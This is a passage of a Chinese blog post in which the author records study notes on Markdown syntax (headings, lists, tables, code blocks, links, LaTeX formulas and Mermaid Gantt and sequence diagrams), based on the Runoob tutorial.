href="https://www.typora.io/">官网</a>可以进行下载</p><p>既然使用的是菜鸟教程，接下来将会使用菜鸟教程中的结构进行学习总结，教程链接为：<a href="https://www.runoob.com/markdown/md-tutorial.html">link</a></p><h2 id="Markdown标题"><a href="#Markdown标题" class="headerlink" title="Markdown标题"></a>Markdown标题</h2><h4 id="1-使用-进行标记标记标题"><a href="#1-使用-进行标记标记标题" class="headerlink" title="1. 使用 # 进行标记标记标题"></a>1. 使用 # 进行标记标记标题</h4><p># 可以标记1-6级标题，每级标题对应相应个数的 # ，如下所示：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h2 id="Markdown段落格式"><a href="#Markdown段落格式" class="headerlink" title="Markdown段落格式"></a>Markdown段落格式</h2><h4 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h4><p>Markdown段落没有特殊的格式，直接编写文字就好，段落的换行是使用两个以上的空格加上回车，或者使用空行来换行。</p><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><p>Markdown中可以使用以下字体样式：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">*斜体文本*</span></span><br><span class="line"><span class="emphasis">_斜体文本_</span></span><br><span class="line"><span class="strong">**粗体文本**</span></span><br><span class="line"><span class="strong">__粗体文本__</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*粗斜体文本*</span>**</span></span><br><span class="line"><span class="strong">__<span class="emphasis">_粗斜体文本_</span>__</span></span><br><span class="line">==强调文本==</span><br><span class="line"><span class="code">`阴影文本`</span></span><br><span class="line">~~删除线文本~~</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线文本<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p><em>斜体文本</em><br><em>斜体文本</em><br><strong>粗体文本</strong><br><strong>粗体文本</strong><br><strong><em>粗斜体文本</em></strong><br><strong><em>粗斜体文本</em></strong><br>==强调文本==<br><code>阴影文本</code><br><del>删除线文本</del><br><u>下划线文本</u></p><p>也就是 * 和 _ 其实是等价的，1个为倾斜，2个为加粗，3个为加粗倾斜，另外强调、删除线和下划线也在这里进行了总结</p><h4 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h4><p>在一行中用3个及以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西，但可以在星号或是减号中间插入空格，如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">*</span> <span class="emphasis">* *</span></span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">**</span><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">- - -</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">----------</span></span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><hr><hr><hr><hr><hr><h4 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h4><p>脚注是对文本的补充说明，感觉皮一下很有意思，脚注格式如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建脚注格式类似这样 [^RUNOOB]。</span><br><span class="line"></span><br><span class="line">[<span class="symbol">^RUNOOB</span>]: <span class="link">菜鸟教程 -- 学的不仅是技术，更是梦想！！！</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>创建脚注格式类似这样 <sup><a href="#fn_RUNOOB" id="reffn_RUNOOB">RUNOOB</a></sup>。</p><blockquote id="fn_RUNOOB"><sup>RUNOOB</sup>. 菜鸟教程 — 学的不仅是技术，更是梦想！！！<a href="#reffn_RUNOOB" title="Jump back to footnote [RUNOOB] in the text."> &#8617;</a></blockquote><p>这个以前没有用过，感觉很有意思，上次看到类似这种的<a href="read://https_blog.csdn.net/?url=https%3A%2F%2Fblog.csdn.net%2Fu011315681%2Farticle%2Fdetails%2F120144013%3Fspm%3D1001.2014.3001.5502#fn1">1</a></p><p>在CSDN中介绍了关于注释的使用方法，但是似乎在Typora中并不支持，此处仅仅作为记录，如下所示：</p><blockquote><p>Markdown将文本转换为 HTML。</p></blockquote><p>而对于注脚，感觉使用数字作为类似文言文的课下注释更好。</p><h2 id="Markdown列表"><a href="#Markdown列表" class="headerlink" title="Markdown列表"></a>Markdown列表</h2><p>分为有序列表和无序列表。</p><p>无序列表以 * 、 + 、 - 作为标记，标记后加一个空格即可形成相应列表，如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> 第一项</span><br><span class="line"><span class="bullet">*</span> 第二项</span><br><span class="line"><span class="bullet">*</span> 第三项</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> 第一项</span><br><span class="line"><span class="bullet">+</span> 第二项</span><br><span class="line"><span class="bullet">+</span> 第三项</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 第一项</span><br><span class="line"><span class="bullet">-</span> 第二项</span><br><span class="line"><span class="bullet">-</span> 第三项</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><ul><li>第一项</li><li>第二项</li><li>第三项</li></ul><ul><li>第一项</li><li>第二项</li><li>第三项</li></ul><ul><li><p>第一项</p></li><li><p>第二项</p></li><li><p>第三项</p></li></ul><p>有序列表则使用数字加 <code>.</code> 来表示，如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 第一项</span><br><span class="line"><span class="bullet">2.</span> 第二项</span><br><span class="line"><span class="bullet">3.</span> 第三项</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><ol><li>第一项</li><li>第二项</li><li>第三项</li></ol><p>列表可以进行嵌套，只需要在子列表选项前加四个空格即可，如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 第一项：</span><br><span class="line"><span class="bullet">    -</span> 第一项嵌套的第一个元素</span><br><span class="line"><span class="bullet">    -</span> 第一项嵌套的第二个元素</span><br><span class="line"><span class="bullet">2.</span> 第二项：</span><br><span class="line"><span class="bullet">    -</span> 第二项嵌套的第一个元素</span><br><span class="line"><span class="bullet">    -</span> 第二项嵌套的第二个元素</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><ol><li><p>第一项：</p><ul><li>第一项嵌套的第一个元素</li><li>第一项嵌套的第二个元素</li></ul></li><li><p>第二项：</p><ul><li><p>第二项嵌套的第一个元素</p></li><li><p>第二项嵌套的第二个元素</p></li></ul></li></ol><p>CSDN上面还介绍了待完成项目的列表，如下所示：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">- </span>[ ] 计划任务</span><br><span class="line"><span class="bullet">- </span>[x] 完成任务</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><ul><li><p>[ ] 计划任务</p></li><li><p>[x] 完成任务</p></li></ul><h2 id="Markdown区块"><a href="#Markdown区块" class="headerlink" title="Markdown区块"></a>Markdown区块</h2><p>这一部分主要介绍引用的使用。</p><p>Markdown区块引用是在段落开头使用 <code>&gt;</code> 符号，然后后面紧跟一个空格符号，如下所示：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">区块引用</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">菜鸟教程</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">学的不仅是技术更是梦想</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><blockquote><p>区块引用<br>菜鸟教程<br>学的不仅是技术更是梦想</p></blockquote><p>使用多个 <code>&gt;</code> 符号可以实现引用嵌套，如下所示：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">最外层</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">&gt; 第一层嵌套</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">&gt; &gt; 第二层嵌套</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><blockquote><p>最外层</p><blockquote><p>第一层嵌套</p><blockquote><p>第二层嵌套</p></blockquote></blockquote></blockquote><p>当然引用中也可以进行列表标注，列表中也可以使用引用作为内容</p><h2 id="Markdown代码"><a href="#Markdown代码" class="headerlink" title="Markdown代码"></a>Markdown代码</h2><p>对于段落上一个函数或者片段的代码，可以使用反引号将其包起来，即使用字体阴影，如下所示：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`printf()` 函数</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p><code>printf()</code> 函数</p><p>对于代码区块，可以使用4个反引号包裹，可以选择指定一种语言或者不指定，如下所示：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```<span class="language-javascript">javascript</span></span><br><span class="line"><span class="language-javascript">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&#x27;RUNOOB&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span>```</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;RUNOOB&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Markdown链接"><a href="#Markdown链接" class="headerlink" title="Markdown链接"></a>Markdown链接</h2><p>使用链接，可以设定链接名称，也可以直接指定链接地址，如下所示：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这是一个链接 <span class="selector-attr">[菜鸟教程]</span>(<span class="attribute">https</span>:<span class="comment">//www.runoob.com)</span></span><br><span class="line">&lt;<span class="attribute">https</span>:<span class="comment">//www.runoob.com&gt;</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>这是一个链接 <a href="https://www.runoob.com">菜鸟教程</a><br><a href="https://www.runoob.com">https://www.runoob.com</a></p><p>对于更高级的链接，可以通过使用变量来设置链接，然后在文档的结尾为变量赋值（网址）,有点像脚注，如下所示：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个链接用 <span class="number">1</span> 作为网址变量 <span class="selector-attr">[Google]</span><span class="selector-attr">[1]</span></span><br><span class="line">这个链接用 <span class="selector-tag">runoob</span> 作为网址变量 <span class="selector-attr">[Runoob]</span><span class="selector-attr">[runoob]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[1]</span>: <span class="selector-tag">http</span>:<span class="comment">//www.google.com/</span></span><br><span class="line"><span class="selector-attr">[runoob]</span>: <span class="selector-tag">http</span>:<span class="comment">//www.runoob.com/</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>这个链接用 1 作为网址变量 <a href="http://www.google.com/">Google</a><br>这个链接用 runoob 作为网址变量 <a href="http://www.runoob.com/">Runoob</a></p><h2 id="Markdown图片"><a href="#Markdown图片" class="headerlink" title="Markdown图片"></a>Markdown图片</h2><p>插入图片格式如下所示：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址)</span><br><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址 &quot;可选标题&quot;)</span><br></pre></td></tr></table></figure><ul><li>首先开头一个<code>!</code></li><li>接下来使用方括号，里面放上图片的替代文字</li><li>接下来是一个圆括号，里面放上图片的地址，最后还可以用引号加上选择性的’title’属性文字，在鼠标移动到时候会显示相应的title属性</li></ul><p>使用实例如下所示：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">![RUNOOB 图标](http:<span class="regexp">//</span>static.runoob.com<span class="regexp">/images/</span>runoob-logo.png)</span><br><span class="line"></span><br><span class="line">![RUNOOB 图标](http:<span class="regexp">//</span>static.runoob.com<span class="regexp">/images/</span>runoob-logo.png <span class="string">&quot;RUNOOB&quot;</span>)</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/703ed36e9477c82e2ef3e5869112b501.png" alt="image-20210906163150303"></p><p>对于图片格式，目前Markdown还不能指定图片的大小，如果需要相应功能，可以使用<img>标签，如下所示：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;http://static.runoob.com/images/runoob-logo.png&quot;</span> <span class="attribute">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p><img src="http://static.runoob.com/images/runoob-logo.png" width="50%"></p><h2 id="Markdown表格"><a href="#Markdown表格" class="headerlink" title="Markdown表格"></a>Markdown表格</h2><p>Markdown制作表格使用 <code>|</code>来分隔不同的单元格，使用 <code>-</code>来分隔表头和其他行</p><p>语法格式如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">  表头   </span>|<span class="string"> 表头  </span>|</span><br><span class="line">|<span class="string">  ----  </span>|<span class="string"> ----  </span>|</span><br><span class="line">|<span class="string"> 单元格  </span>|<span class="string"> 单元格 </span>|</span><br><span class="line">|<span class="string"> 单元格  </span>|<span class="string"> 单元格 </span>|</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><div class="table-container"><table><thead><tr><th>表头</th><th>表头</th></tr></thead><tbody><tr><td>单元格</td><td>单元格</td></tr><tr><td>单元格</td><td>单元格</td></tr></tbody></table></div><p>对于表格也可以设置表格的对齐方式，设置在分隔符区域，主要有以下三种：</p><ul><li><code>-:</code> 设置内容和标题栏居右对齐</li><li><code>:-</code>设置内容和标题栏居左对齐</li><li><code>:-:</code>设置内容和标题栏居中对齐</li></ul><p>实例如下所示：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string"> 左对齐 </span>|<span class="string"> 右对齐 </span>|<span class="string"> 居中对齐 </span>|</span><br><span class="line">|<span class="string"> :-----</span>|<span class="string"> ----: </span>|<span class="string"> :----: </span>|</span><br><span class="line">|<span class="string"> 单元格 </span>|<span class="string"> 单元格 </span>|<span class="string"> 单元格 </span>|</span><br><span class="line">|<span class="string"> 单元格 </span>|<span class="string"> 单元格 </span>|<span class="string"> 单元格 </span>|</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><div class="table-container"><table><thead><tr><th style="text-align:left">左对齐</th><th style="text-align:right">右对齐</th><th style="text-align:center">居中对齐</th></tr></thead><tbody><tr><td style="text-align:left">单元格</td><td style="text-align:right">单元格</td><td style="text-align:center">单元格</td></tr><tr><td style="text-align:left">单元格</td><td style="text-align:right">单元格</td><td style="text-align:center">单元格</td></tr></tbody></table></div><p>个人感觉居中对齐会用的比较多，这里再次强调居中对齐为<code>:-:</code></p><h2 id="Markdown的高级用法"><a href="#Markdown的高级用法" class="headerlink" title="Markdown的高级用法"></a>Markdown的高级用法</h2><p>这里展示Markdown的一些其他用法，可能不会太常用，仅仅用于记录，以后在遇到更多的用法时候也会进行更新。</p><h4 id="支持HTML元素"><a href="#支持HTML元素" class="headerlink" title="支持HTML元素"></a>支持HTML元素</h4><p>个人没有学习过HTML，所以这里仅仅列出教程中提出的相关用法，作为参考</p><p>目前支持的 HTML 元素有：<code>&lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sup&gt; &lt;sub&gt; &lt;br&gt;</code>等 ，如下使用<code>&lt;kdd&gt;</code>元素作为按钮元素样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 &lt;<span class="selector-tag">kbd</span>&gt;Ctrl&lt;/<span class="selector-tag">kbd</span>&gt;+&lt;<span class="selector-tag">kbd</span>&gt;Alt&lt;/<span class="selector-tag">kbd</span>&gt;+&lt;<span class="selector-tag">kbd</span>&gt;<span class="selector-tag">Del</span>&lt;/<span class="selector-tag">kbd</span>&gt; 重启电脑</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>使用 <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Del</kbd> 重启电脑</p><p>在查询了相关HTML标签之后列出标签的意义：</p><p><code>&lt;kdd&gt;</code>：按钮</p><p><code>&lt;b&gt;</code>：加粗文本</p><p><code>&lt;i&gt;</code>：斜体文本</p><p><code>&lt;em&gt;</code>：查询为强调，似乎还是斜体</p><p><code>&lt;sup&gt;</code>：上标文本，当然个人感觉使用字体中提到的更加方便，天知道当时课程让读论文时候用标签写上下标是一种怎样的折磨（</p><p><code>&lt;sub&gt;</code>：下标文本，当然个人感觉使用字体中提到的更加方便</p><p><code>&lt;br&gt;</code>：换行</p><p><img>：图片标签，在前面指定图片大小时候用到</p><blockquote><p>关于标签内容可以参考<a href="https://www.w3school.com.cn/tags/tag_html.asp">该网页</a></p></blockquote><h4 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h4><p>虽然放在高级用法，但是感觉没啥好说的，很多地方已经用到了转义符<code>\</code>，否则没有办法打这些具有特殊意义的符号，在以下符号前需要加转义符号：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\   反斜线</span><br><span class="line">`   反引号</span><br><span class="line"><span class="bullet">*   </span>星号</span><br><span class="line">_   下划线</span><br><span class="line">&#123;&#125;  花括号</span><br><span class="line">[]  方括号</span><br><span class="line">()  小括号</span><br><span class="line">#   井字号</span><br><span class="line">+   加号</span><br><span class="line"><span class="bullet">-   </span>减号</span><br><span class="line"><span class="bullet">.   </span>英文句点</span><br><span class="line">!   感叹号</span><br></pre></td></tr></table></figure><h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>包括这一部分的后面几个部分，与其说是Markdown倒不如说是相应的模块的语言，例如公式领域的LaTeX。</p><p>在使用LaTeX时候，使用两个$$$$符号包裹相应公式，以下面的公式举例：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line"><span class="string">\mathbf&#123;V&#125;_1</span> <span class="string">\times</span> <span class="string">\mathbf&#123;V&#125;_2</span> =  <span class="string">\begin&#123;vmatrix&#125;</span> </span><br><span class="line"><span class="string">\mathbf&#123;i&#125;</span> &amp; <span class="string">\mathbf&#123;j&#125;</span> &amp; <span class="string">\mathbf&#123;k&#125;</span> <span class="string">\\</span></span><br><span class="line"><span class="string">\frac&#123;\partial</span> X&#125;&#123;<span class="string">\partial</span> u&#125; &amp;  <span class="string">\frac&#123;\partial</span> Y&#125;&#123;<span class="string">\partial</span> u&#125; &amp; <span class="number">0</span> <span class="string">\\</span></span><br><span class="line"><span class="string">\frac&#123;\partial</span> X&#125;&#123;<span class="string">\partial</span> v&#125; &amp;  <span class="string">\frac&#123;\partial</span> Y&#125;&#123;<span class="string">\partial</span> v&#125; &amp; <span class="number">0</span> <span class="string">\\</span></span><br><span class="line"><span class="string">\end&#123;vmatrix&#125;</span></span><br><span class="line">$&#123;$tep1&#125;&#123;<span class="string">\style&#123;visibility:hidden&#125;&#123;(x+1)(x+1)&#125;&#125;</span></span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><script type="math/tex; mode=display">\mathbf{V}_1 \times \mathbf{V}_2 =  \begin{vmatrix} \mathbf{i} & \mathbf{j} & \mathbf{k} \\\frac{\partial X}{\partial u} &  \frac{\partial Y}{\partial u} & 0 \\\frac{\partial X}{\partial v} &  \frac{\partial Y}{\partial v} & 0 \\\end{vmatrix}${$tep1}{\style{visibility:hidden}{(x+1)(x+1)}}</script><p>在CSDN的编辑页面给出的示例中，简单公式可以使用的是单个<code>$</code>进行包裹，下面为CSDN中的示例：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Gamma</span>公式展示 <span class="symbol">$</span>\<span class="built_in">Gamma</span>(n) = (n<span class="number">-1</span>)!\quad\forall</span><br><span class="line">n\in\mathbb N<span class="symbol">$</span> 是通过欧拉积分</span><br><span class="line"></span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br><span class="line">\<span class="built_in">Gamma</span>(z) = \int_0^\infty t^&#123;z<span class="number">-1</span>&#125;e^&#123;-t&#125;dt\,.</span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>Gamma公式展示 $\Gamma(n) = (n-1)!\quad\forall<br>n\in\mathbb N$ 是通过欧拉积分</p><script type="math/tex; mode=display">\Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\,.</script><p>以上仅仅给出例子，但是并不能理解，看来以后还得留出时间搞搞LaTeX</p><blockquote><p><a href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">更多的关于 <strong>LaTeX</strong> 数学表达式的信息</a></p></blockquote><h4 id="Mermaid"><a href="#Mermaid" class="headerlink" title="Mermaid"></a>Mermaid</h4><p>本来是要按照菜鸟教程中的结构进行学习的，但是学到后面发现其实都是基于Mermaid进行这几个图的绘制，所以干脆就直接将Mermaid作为标题了</p><p>yysy，Mermaid好像是个宝藏，有很多很有意思的地方，对于绘制流程图什么的也很有用，虽然在后面也有提及其官方网站链接，这里就先直接给出吧，作为下一个想要进行学习总结的小点。</p><p><a href="https://mermaidjs.github.io/">链接在此</a></p><p>链接中详细介绍了关于Mermaid的使用方法，而对于这篇Markdown总结来说，下面仅仅给出相关的示例。</p><h5 id="甘特图"><a href="#甘特图" class="headerlink" title="甘特图"></a>甘特图</h5><blockquote><p>甘特图（Gantt chart）又称为横道图、条状图(Bar chart)，其通过条状图来显示项目、进度和其他时间相关的系统进展的内在关系随着时间进展的情况，以提出者亨利·劳伦斯·甘特（Henry Laurence Gantt）先生的名字命名。</p></blockquote><p>以下给出一个甘特图实例：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">```mermaid</span><br><span class="line">gantt</span><br><span class="line">        dateFormat  YYYY-MM-DD</span><br><span class="line">        title Adding GANTT diagram functionality to mermaid</span><br><span class="line">        section 现有任务</span><br><span class="line">        已完成               :done,    des1, 2014<span class="string">-01</span><span class="string">-06</span>,2014<span class="string">-01</span><span class="string">-08</span></span><br><span class="line">        进行中               :active,  des2, 2014<span class="string">-01</span><span class="string">-09</span>, 3d</span><br><span class="line">        计划一               :         des3, after des2, 5d</span><br><span class="line">        计划二               :         des4, after des3, 5d</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gantt</span><br><span class="line">        dateFormat  YYYY-MM-DD</span><br><span class="line">        title Adding GANTT diagram functionality to mermaid</span><br><span class="line">        section 现有任务</span><br><span class="line">        已完成               :done,    des1, 2014-01-06,2014-01-08</span><br><span class="line">        进行中               :active,  des2, 2014-01-09, 3d</span><br><span class="line">        计划一               :         des3, after des2, 5d</span><br><span class="line">        计划二               :         des4, after des3, 5d</span><br></pre></td></tr></table></figure><p>yysy，甘特图还挺有意思的，看起来也不是那么复杂，以后可以尝试套用该模板进行编辑。</p><h5 id="UML图表"><a href="#UML图表" class="headerlink" title="UML图表"></a>UML图表</h5><p>下面将生成一个序列图：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">```mermaid</span></span><br><span class="line"><span class="attribute">sequenceDiagram</span></span><br><span class="line"><span class="attribute">张三 -&gt;&gt; 李四</span><span class="punctuation">:</span> <span class="string">你好！李四, 最近怎么样?</span></span><br><span class="line"><span class="attribute">李四--&gt;&gt;王五</span><span class="punctuation">:</span> <span class="string">你最近怎么样，王五？</span></span><br><span class="line"><span class="attribute">李四--x 张三</span><span class="punctuation">:</span> <span class="string">我很好，谢谢!</span></span><br><span class="line"><span class="attribute">李四-x 王五</span><span class="punctuation">:</span> <span class="string">我很好，谢谢!</span></span><br><span class="line"><span class="attribute">Note right of 王五</span><span class="punctuation">:</span> <span class="string">李四想了很长时间, 文字太长了&lt;br/&gt;不适合放在一行.</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">李四--&gt;&gt;张三</span><span class="punctuation">:</span> <span class="string">打量着王五...</span></span><br><span class="line"><span class="attribute">张三-&gt;&gt;王五</span><span class="punctuation">:</span> <span class="string">很好... 王五, 你怎么样?</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">张三 